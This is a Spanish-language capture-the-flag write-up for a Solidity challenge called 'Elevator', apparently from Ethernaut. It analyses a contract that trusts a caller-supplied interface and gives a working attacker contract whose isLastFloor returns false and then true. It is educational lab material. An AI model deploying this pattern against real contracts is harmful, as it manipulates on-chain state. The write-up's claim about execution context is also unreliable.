# 11-Elevator
## Objetivo
El objetivo de este reto es lograr llegar al último piso.

## Contrato
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

## Análisis de contrato
* Interface Building: 
  * declara la función isLastFloor para ser implementada por el contrato. Esta recibe un entero y retorna un booleano.
* Contrato Elevator:
  * posee la variable top, es pública y del tipo **_bool_**
  * posee la variable floor, es pública y del tipo **_uint_**
  * función goTo(), es pública y recibe como parámetro un entero. Genera una instancia de la interfaz Building. Luego valida si la función isLastFloor de la interfaz es 
distinto de verdadero tomando como valor para comparar el parámetro recibido. Si esto se cumple, asigna el parámetro recibido a la variable floor. Después, asigna a la 
variable top, el valor de ejecutar la función isLastFloor tomando el valor de la variable floor.

## Solución
La clave en este reto está en la interfaz Building. El contrato Elevator no la implementa por lo que generaremos un nuevo contrato que implemente esta interfaz a nuestro
beneficio. El objetivo es implementar la función isLastFloor de manera tal que cuando sea ejecutada, primero retorne false y luego retorne true
```
if (! building.isLastFloor(_floor)) { //PRIMERA LLAMADA
      floor = _floor;
      top = building.isLastFloor(floor); //SEGUNDA LLAMADA
    }    
```
Esto para que ingrese al if y luego setee true a la variable top.

### Contrato malicioso
```Solidity
contract hackElevator {
    Elevator public elevator = Elevator(ADDRESS DE TU INSTANCIA ELEVATOR);
    bool public flag = false;

    function go() public{
        elevator.goTo(2);
    }

    function isLastFloor(uint) external returns(bool){
        if (! flag){
            flag = true;
            return false;
        }else{
            flag = false;
            return true;
        }
    }
}
```
* Posee la variable flag que es del tipo booleano
* función go(), llama a la función goTo del contrato Elevator
* función isLastFloor, implementación de la función de la interza Building. Validamos si la variable flag es false, si esto se cumple le asignamos true y retornamos false
* si no, asigna el valor false a la variable flag y retorna true.

Ya que el contrato original no implementa la interfaz, se va a ejecutar la función de nuestro contrato en el contexto del contrato original. [Documentación de interfaces](https://docs.soliditylang.org/en/v0.8.13/contracts.html?highlight=abstract#interfaces)

Una vez deployado el contrato malicioso, ejecutamos su función go(). Validamos que la variable top posea el valor true.
Enviamos la instancia y listo! Reto completado.
